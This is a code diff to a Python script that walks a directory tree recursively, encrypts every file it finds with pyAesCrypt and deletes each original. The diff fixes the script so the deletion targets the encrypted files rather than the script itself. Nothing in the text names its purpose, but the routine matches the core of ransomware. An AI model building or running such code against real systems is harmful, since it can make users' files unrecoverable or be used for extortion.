@@ -1,6 +1,8 @@
 import pyAesCrypt
 import os
 
+
+
 # enscrypt function
 def encryption(file, password):
     
@@ -15,11 +17,11 @@ def encryption(file, password):
         buffer_size
     )
     
-# show info about processing
-print("[File '" + str(os.path.splitext(__file__)[0]) + "' escryptes]")
+    # show info about processing
+    print("[File '" + str(os.path.splitext(file)[0]) + "' escryptes]")
 
-# delete origin file
-os.remove(__file__)
+    # delete origin file
+    os.remove(file)
 
 # folder scaning
 def foldersScaning(dir, password):
@@ -34,7 +36,7 @@ def foldersScaning(dir, password):
                 encryption(path, password)
             except Exception as ex:
                 print(ex)
-        #if find folers scaning again
+        # if find folers scaning again
         else:
             foldersScaning(path, password)
             
